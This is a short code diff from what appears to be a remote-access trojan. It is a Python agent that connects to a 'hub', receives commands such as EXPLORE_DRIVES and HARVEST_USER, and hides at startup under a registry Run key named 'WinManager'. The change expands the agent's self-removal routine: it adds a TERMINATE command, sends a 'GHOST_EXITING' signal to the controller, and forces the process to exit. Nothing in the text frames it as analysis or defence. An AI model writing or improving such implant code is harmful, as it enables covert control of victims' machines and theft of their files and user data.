@@ -1201,7 +1201,11 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             except Exception:
                                 pass
                         client.send(b'V_PULSE_EOF\n')
-                    elif command == 'KILL_AGENT':
+                    elif command == 'KILL_AGENT' or command == 'TERMINATE':
+                        try:
+                            client.send(b"GHOST_EXITING\n")
+                        except Exception:
+                            pass
                         try:
                             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                             winreg.DeleteValue(key, 'WinManager')
@@ -1221,7 +1225,8 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 os.remove(target_file)
                         except Exception:
                             pass
-                        return
+                        # Force immediate process termination - bypasses all finally blocks and loops
+                        os._exit(0)
                     elif command == 'EXPLORE_DRIVES':
                         send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
                     elif command == 'HARVEST_USER':
